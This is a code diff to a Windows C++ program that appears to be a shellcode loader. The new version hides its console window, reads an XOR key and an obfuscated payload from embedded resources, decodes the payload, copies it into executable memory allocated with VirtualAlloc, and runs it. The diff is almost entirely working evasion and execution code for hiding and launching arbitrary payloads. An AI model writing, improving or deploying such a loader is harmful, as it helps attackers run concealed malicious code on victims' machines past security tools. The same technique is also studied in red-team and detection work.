@@ -1,21 +1,31 @@
 ﻿#include <iostream>
+#include <string>
 #include <windows.h>
+#include "resource.h"
 
 int main(int argc, char** argv)
 {
-	const std::string KEY = "<your key goes here>";
+	ShowWindow(GetConsoleWindow(), SW_HIDE);
 
-	char b[] = { <your obfuscated payload goes here> };
-	char c[sizeof(b)] = { 0 };
+	HRSRC keyResource = FindResource(NULL, MAKEINTRESOURCE(IDR_KEY1), L"key");
+	DWORD keySize = SizeofResource(NULL, keyResource);
+	char* key = (char*)LockResource(LoadResource(NULL, keyResource));
 
-	for (int i = 0; i < sizeof(b); i++)
+	HRSRC obfuscatedPayloadResource = FindResource(NULL, MAKEINTRESOURCE(IDR_OBFUSCATEDPAYLOAD1), L"obfuscatedPayload");
+	DWORD obfuscatedPayloadSize = SizeofResource(NULL, obfuscatedPayloadResource);
+	char* obfuscatedPayload = (char*)LockResource(LoadResource(NULL, obfuscatedPayloadResource));
+	std::string payload = "";
+
+	int keyIndex = 0;
+	for (unsigned int i = 0; i < obfuscatedPayloadSize; i += 4)
 	{
-		c[i] = b[i] ^ KEY[i % KEY.size()];
+		std::string currentByte = std::string() + obfuscatedPayload[i] + obfuscatedPayload[i + 1] + obfuscatedPayload[i + 2] + obfuscatedPayload[i + 3];
+		payload += stol(currentByte, nullptr, 0) ^ key[keyIndex++ % keySize];
 	}
 
-	void* exec = VirtualAlloc(0, sizeof(c), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+	void* exec = VirtualAlloc(0, payload.size(), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 
-	std::memcpy(exec, c, sizeof(c));
+	std::memcpy(exec, payload.c_str(), payload.size());
 
 	((void(*)())exec)();
 
